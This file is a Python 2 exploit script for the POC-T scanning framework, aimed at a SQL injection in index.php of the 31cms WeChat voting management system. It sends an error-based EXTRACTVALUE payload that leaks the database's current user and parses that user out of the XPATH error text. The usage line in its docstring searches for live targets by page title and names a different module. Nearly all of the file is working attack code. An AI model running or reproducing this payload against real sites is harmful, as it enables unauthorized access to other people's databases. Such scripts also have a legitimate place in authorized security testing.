#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author 野驴


"""
31cmd index.php SQL Inject Vulnerability (MySQL Exploit)

Usage:
  python POC-T.py -s zabbix-jsrpc-mysql-exp -aG "title:微联云数字投票管理系统 or title:31cms2016投票管理系统" or title:微信数字投票管理"

"""

import re
import urllib2


def poc(url):
    url = url if '://' in url else 'http://' + url
    if url[-1] != '/': url += '/'
    payload = "/index.php?g=Wap&m=Vote&a=detail&token=Eioa5C5oj3S32qhH&id=9%20AND%20EXTRACTVALUE(5420,CONCAT(0x5c,0x7170717071,(MID((IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,21)),0x716a626a71))"
    try:
        response = urllib2.urlopen(url + payload, timeout=10).read()
    except Exception, msg:
        # print msg
        pass
    else:
        result_reg = re.compile(r".*qpqpq(.*)qjbjq.*")
        User = ""
        # Session_id = ""
        if 'XPATH syntax error' in response:
            results = result_reg.findall(response)
            User = "User:" + results[0]
            return (url, User)
        else:
            return False

    return False

